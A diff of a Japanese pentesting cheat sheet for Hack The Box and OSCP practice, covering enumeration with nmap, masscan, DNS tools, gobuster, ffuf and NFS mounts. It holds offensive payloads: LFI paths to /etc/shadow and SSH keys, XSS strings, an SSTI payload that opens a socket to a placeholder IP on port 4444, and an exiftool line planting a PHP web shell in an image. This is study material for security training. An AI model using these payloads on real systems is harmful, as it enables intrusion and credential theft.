@@ -6,6 +6,56 @@ Hack The Boxの攻略やOSCPの取得を目指して、まとめているチー�
 Twitter:@yukitsukai1731
 
 # Enum
+## Nmap
+```
+kali@kali:$ sudo nmap -sC -sV -oN nmap/initial <ipアドレス>
+```
+```
+kali@kali:$ sudo nmap -T5 -p- -oN nmap/full <ipアドレス>
+```
+```
+kali@kali:$ nmap --script http-enum <ipアドレス>　-p 80
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum:
+|   /admin/: Possible admin folder
+|   /admin/index.html: Possible admin folder
+|   /wp-login.php: Possible admin folder
+|   /robots.txt: Robots file
+|   /feed/: Wordpress version: 4.3.1
+|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
+|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
+|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
+|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
+|   /wp-login.php: Wordpress login page.
+|   /wp-admin/upgrade.php: Wordpress login page.
+|_  /readme.html: Interesting, a readme.
+```
+- -sS...ステルス/SYNスキャン
+- -sT...TCPコネクトスキャン
+- -sU...UDPスキャン
+- -sn...ネットワークスイープ
+- -A...OSのバージョン検出
+- -sC...--script=defaultの意味
+- -sV...特定のポートで動作しているサービスを識別
+- --script=...様々なスクリプトの使用
+  - dns-zone-transfer
+  - smb-os-discovery
+  - http-enum
+  - vuln
+- -O...OSフィンガープリンティング(ターゲットのOS判別)
+- -v...詳細の出力
+- -oG...grep可能なファイル形式に出力
+- --top-ports...優先度の高い順にポートを検出(/usr/share/nmap/nmap-servicesに依存)
+
+## Masscan
+Massscanはインターネット全体を約6分でスキャンし、1秒間に1000万パケットという驚異的な数のパケットを送信する最速のポートスキャナー。  
+raw socketsの権限を必要とするためsudoを用いる。　　
+下記のコマンドではTCPポート80が空いているホストをclass Aサブネットで列挙している。
+```
+kali@kali:~$ sudo masscan -p80 10.0.0.0/8
+```
+
 ## FTP(21)
 ```
 ログインユーザの指定...user (ユーザ名) (パスワード)
@@ -41,41 +91,64 @@ chmod 600 id_rsa
 - -b...ビット数の固定(-t rsa -b 4096など)
 - -f...ファイル名(id_????の?部分)
 
-### 公開鍵認証
+### 公開鍵認証方式でsshログイン
 ```
 ssh -i id_rsa root@10.10.10.1
 ```
 
-## DNS(53)
+### SMTP(25)
 未完了
 
-## HTTP(80)
-### Nmap
+## DNS(53)
+- -NS(ネームサーバーレコード)...ドメインのDNSレコードをホストする権威サーバーの名前が含まれる
+- -A(ホストレコード)...ホスト名のIPアドレスが含まれている
+- -MX(mail Exchangeレコード)...ドメインの電子メール処理を担当するサーバーの名前が含まれている
+- -PTR(ポインタレコード)...逆引きで使用されIPアドレスに関連するレコードを見つけるために使用される
+- -TXT(テキストレコード)...テキストレコードは任意のデータを含むことができ、ドメインの所有権確認などを行える
+
+hostコマンドはデフォルトではAレコードを検索するが、-tオプションをつけることで、その他のレコードを検索することも可能。
 ```
-kali@kali:$ nmap -sC -sV -oN nmap/initial <ipアドレス>
-```
-```
-kali@kali:$ sudo nmap -T5 -p- -oN nmap/full <ipアドレス>
-```
-```
-kali@kali:$ nmap --script http-enum <ipアドレス>　-p 80
-PORT   STATE SERVICE
-80/tcp open  http
-| http-enum:
-|   /admin/: Possible admin folder
-|   /admin/index.html: Possible admin folder
-|   /wp-login.php: Possible admin folder
-|   /robots.txt: Robots file
-|   /feed/: Wordpress version: 4.3.1
-|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
-|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
-|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
-|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
-|   /wp-login.php: Wordpress login page.
-|   /wp-admin/upgrade.php: Wordpress login page.
-|_  /readme.html: Interesting, a readme.
+kali@kali:~$ host -t txt megacorpone.com
 ```
 
+### DNSゾーン転送
+権威DNSサーバの設定不備によってゾーン情報を取得できることがある。  
+これによりサーバーの名前、アドレス、機能などを調べることができる。
+```
+host -l <domain name> <dns server address>
+```
+
+### DNSRecon
+DNS列挙スクリプト。
+```
+1.kali@kali:~$ dnsrecon -d megacorpone.com -t axfr
+2.kali@kali:~$ dnsrecon -d megacorpone.com -D ~/list.txt -t brt
+```
+- -d...ドメイン名の指定
+- -t...実行する列挙の種類(1つ目はゾーン転送)
+- -t...実行する列挙の種類(2つ目はブルートフォース)
+- -D...サブドメイン文字列を含むファイルの指定
+
+### DNSenum
+DNSReconとは異なった出力をするDNS列挙ツール。
+```
+kali@kali:~$ dnsenum zonetransfer.me
+```
+
+## HTTP(80)
+### チェック項目
+未完了(robots.txtやらいろいろ確認事項を列挙)
+
+### robots.txtの確認
+```
+curl http://<IPアドレス>robots.txt
+```
+
+### /etc/hostsファイルの編集
+```
+sudo emacs /etc/hosts
+10.10.10.1  admin.htb
+```
 
 ### Gobuster
 ```
@@ -91,7 +164,11 @@ gobuster dir -t 50 -u <url>  -w /usr/share/wordlists/dirbuster/directory-list-2.
 - -s...ステータスコードの指定
 
 ### ffuf
-未完了
+*追記予定
+```
+Directory Fuzzing:
+ffuf -c -w /path/to/wordlist -u http://test.com/FUZZ -o <outputfile>
+```
 
 ### Nikto
 ```
@@ -136,18 +213,6 @@ LFIなどを利用する時にも使用。
 
 ![](./image/2021-05-06-17-25-26.png)
 
-
-### robots.txtの確認
-```
-curl http://<IPアドレス>robots.txt
-```
-
-### /etc/hostsファイルの編集
-```
-sudo emacs /etc/hosts
-10.10.10.1  admin.htb
-```
-
 ### LFI
 ```
 http://<url>/script.php?page=../../../../../../../../etc/passwd
@@ -164,7 +229,7 @@ http://example.com/index.php?page=....//....//etc/passwd
 ```
 
 LFIを利用して読み取りを狙うファイル:  
-Linux:
+* Linux
 ```
 /etc/passwd
 /etc/shadow
@@ -179,14 +244,14 @@ Linux:
 /home/user/.ssh/id_rsa
 ```
 
-Windows:
+* Windows
 ```
 /boot.ini
 /autoexec.bat
 /windows/system32/drivers/etc/hosts
 /windows/repair/S
 ```
-### XSS
+### XSS(クロスサイトスクリプティング)
 ```
 <script>alert(1);</script>
 "><script>alert(1);</script>
@@ -222,23 +287,6 @@ sqlmap -u http：//192.168.0.1/vuln.php?id=1 --user-agent "Mozilla / 5.0（X11; 
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 ```
 
-### exiftools
-・画像情報の表示
-```
-exiftool image.jpg
-```
-
-・画像ファイルにexiftoolを用いてコメントにリバースシェルペイロードを記述
-```
-exiftool -Comment=’<?php echo “<pre>”; system($_GET[‘cmd’]); ?>’ image.png
-```
-
-### steghide
-・ステガノグラフィー
-```
-steghide extract -sf image.jpg
-```
-
 ### CMS
 - CMSの特定後、ログインページについて調査
 - その後、まずはデフォルトパスワードを入力
@@ -246,7 +294,7 @@ steghide extract -sf image.jpg
 - サーバ内で見つけたものなどを用いて、パスワード推測
 - 最終的にHydraなどでブルートフォース
 
-・WordPress
+#### WordPress
 ```
 ログイン後、
 1.[Appearance]→[Editor]→[404 Template(404.php)]を選択して編集
@@ -256,7 +304,7 @@ steghide extract -sf image.jpg
   http://192.168.1.101/wordpress/wp-content/themes/twentyfifteen/404.php
 ```
 
-・drupal
+#### drupal
 ```
 MySQLに接続するための認証情報が記述されている
 /var/www/html/sites/default/settings.php
@@ -277,8 +325,56 @@ $databases = array (
   ),
 );
 ```
+### exiftools
+・画像情報の表示
+```
+exiftool image.jpg
+```
 
-## SMB(445)
+・画像ファイルにexiftoolを用いてコメントにリバースシェルペイロードを記述
+```
+exiftool -Comment=’<?php echo “<pre>”; system($_GET[‘cmd’]); ?>’ image.png
+```
+
+### steghide
+・ステガノグラフィー
+```
+steghide extract -sf image.jpg
+```
+
+
+## NFS{RPCbind,Portmapper}(111)
+Network File System(NFS)はクライアントコンピュータのユーザがあたかもローカルにマウントされたストレージ上にあるかのようにファイルにアクセスすることを可能にする。  
+NFSはUNIX系OSで使用されることが多く、その実装は安全ではない。  
+NFSで使用されるRPCbindとPortmapperはともにTCPポート111で動作する。
+```
+kali@kali:~$ nmap -v -p 111 10.10.10.1
+```
+```
+kali@kali:~$ nmap -sV -p 111 --script=rpcinfo 10.10.10.1
+```
+
+NFSが動作していることが分かった場合/usr/share/nmap/scriptsにあるNSEスクリプトを使用して、サービスの列挙や追加サービスの発見を行うことができる。「*」を使用することで、まとめて使用することができる。
+```
+kali@kali:~$ ls -1 /usr/share/nmap/scripts/nfs*
+/usr/share/nmap/scripts/nfs-ls.nse
+/usr/share/nmap/scripts/nfs-showmount.nse
+/usr/share/nmap/scripts/nfs-statfs.nse
+
+kali@kali:~$ nmap -p 111 --script nfs* 10.11.1.72
+```
+
+### NFSのマウント
+mountコマンドを使用することでファイルのアクセスできるようになる。  
+オプション-o nolockでファイルロックを無効にする。
+```
+kali@kali:~$ mkdir test
+kali@kali:~$ sudo mount -o nolock 10.10.10.1:/home ~/test/
+kali@kali:~$ cd test/ && ls
+jenny joe45 john marcus ryuu
+```
+
+## SMB(139,445)
 ### smbclient
 匿名ログインが有効になっているかの確認。
 ```
